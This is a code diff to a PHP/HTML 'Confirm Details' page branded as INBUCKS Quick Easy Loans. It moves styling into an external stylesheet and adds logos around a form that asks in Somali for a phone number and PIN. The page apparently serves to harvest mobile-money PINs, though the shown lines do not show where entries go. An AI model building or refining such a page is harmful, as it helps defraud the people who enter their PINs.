@@ -9,109 +9,15 @@ if(isset($_GET['error'])){
 <head>
 
 <title>Confirm Details</title>
-<head>
-
-<title>Confirm Details</title>
-
-/* FULL PAGE BACKGROUND */
-body {
-    margin: 0;
-    font-family: Arial, sans-serif;
-
-    background: linear-gradient(135deg, #a8e063, #56ab2f);
-
-    display: flex;
-    justify-content: center;
-    align-items: center;
-
-    height: 100vh;
-}
-
-/* MAIN WHITE BOX */
-.container {
-    width: 90%;
-    max-width: 400px;
-
-    background: #fff;
-    border-radius: 20px;
-
-    padding: 25px;
-    text-align: center;
-
-    box-shadow: 0 5px 20px rgba(0,0,0,0.2);
-}
-
-/* PHONE INPUT */
-.phone-box {
-    display: flex;
-    align-items: center;
-
-    border: 2px solid #4CAF50;
-    border-radius: 12px;
-
-    padding: 10px;
-    margin-bottom: 20px;
-}
-
-.phone-box span {
-    margin-right: 10px;
-}
-
-.phone-box input {
-    border: none;
-    outline: none;
-    width: 100%;
-    font-size: 16px;
-}
-
-/* PIN BOXES */
-.pin-box {
-    display: flex;
-    justify-content: center;
-    gap: 12px;
-    margin: 20px 0;
-}
-
-.pin {
-    width: 55px;
-    height: 55px;
-
-    text-align: center;
-    font-size: 22px;
-
-    border: 2px solid #4CAF50;
-    border-radius: 10px;
-}
-
-/* EYE ICON */
-.pin-container {
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    gap: 10px;
-}
-
-/* BUTTON */
-button {
-    width: 100%;
-    padding: 15px;
-
-    border: none;
-    border-radius: 12px;
-
-    background: #ccc;
-    color: white;
-
-    font-size: 16px;
-    font-weight: bold;
-}
-
-</head>
+<link rel="stylesheet" href="style.css">
 
 </head>
 
 <body>
-
+<!-- top logo -->
+<div class="logo-container">
+     <img src="logo.png" alt="INBUCKS QUICK EASY LOANS Logo" class="logo">
+</div>
 <div class="container">
 
 <h2>Fadlan geli lambarka iyo PIN-ka si aad u sii wadato</h2>
@@ -210,6 +116,9 @@ document.querySelector("form").addEventListener("submit", function() {
 });
 </script>
 
-
+<!-- Bottom Logo -->
+<div class="logo-container bottom">
+     <img src="logo.png" alt="INBUCKS QUICK EASY LOANS Logo" class="logo">
+</div>
 </body>
 </html>
